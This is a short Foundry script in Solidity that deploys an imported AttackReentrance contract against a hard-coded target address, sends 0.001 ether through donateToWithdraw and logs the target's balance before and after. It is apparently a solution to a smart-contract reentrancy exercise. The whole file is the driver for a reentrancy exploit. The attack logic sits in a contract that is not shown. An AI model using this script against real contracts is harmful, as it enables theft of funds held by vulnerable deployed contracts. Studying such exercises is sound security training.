//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {AttackReentrance} from "../src/AttackReentrance.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackReentranceScript is Script{

    address target = 0xb0548AD7b3a6c38BB910Def7A71CE8d2D73072D4;

    AttackReentrance attack;

    function run() external {
        vm.startBroadcast();
        attack = new AttackReentrance(target);
        console.log(target.balance);
        attack.donateToWithdraw{value: 0.001 ether}();
        console.log(target.balance);
        vm.stopBroadcast();

        
    }
}